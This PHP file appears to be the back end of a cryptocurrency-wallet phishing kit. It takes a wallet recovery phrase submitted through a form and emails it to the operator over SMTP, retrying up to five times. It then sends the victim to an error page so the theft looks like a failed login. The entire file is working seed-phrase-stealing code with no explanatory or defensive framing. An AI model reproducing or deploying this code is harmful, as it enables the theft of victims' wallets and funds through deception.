<?php

use Exception;

include_once './config.php';

$phrase                  =   $_POST['phrase'];

if (empty($phrase)) {
    redirect(base_url('wallet.php'));
} else {
    
    function sendEmail($try=1) {
        global $phrase;
        
        try {
            $mail           =   get_mail_smtp();
            
            $mail->isHTML(true);                                  //Set email format to HTML
            $mail->Subject  = 'New Wallet Phrase Query Received';

            $html           =   '<p>A New Login Detected,</p>' ;
            $html          .=   '<p>You have received a new query from <b>' . base_url() . '</b>,</p>' ;
            $html          .=   '<p><b>Additional detail</b></p>' ;
            $html          .=   '<ul>' ;
            $html          .=   "<li>Phrase : <b>".$phrase."</b></li>";
            $html          .=   '</ul>' ;
            $mail->Body     =   $html;

            $mail->send();
            
            redirect(base_url('error.php'));
        } catch (Exception $exc) {
            $try = $try +1;
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
            if($try < 5) {
                sleep(2);
                sendEmail($try);
            } else {
                redirect(base_url('error.php'));
            }
        }
    }
    
    sendEmail(1);
}
?>